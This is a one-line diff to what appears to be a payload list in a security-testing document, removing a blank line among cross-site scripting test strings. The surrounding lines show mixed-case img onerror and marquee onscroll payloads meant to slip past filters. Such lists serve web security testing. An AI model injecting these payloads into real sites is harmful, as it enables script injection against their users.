@@ -26,7 +26,6 @@ Payload
 - ``<iMg src=1 oNeRrOr=alert(1)>``
 - ``<ImG src=1 OnErRoR=alert(1)>``
 - ``<img src=1 onerror="alert(&quot;M&quot;)">``
-
 - ``<marquee onscroll=alert(1)>``
 - ``<mArQuEe OnScRoLl=alert(1)>``
 - ``<MaRqUeE oNsCrOlL=alert(1)>``
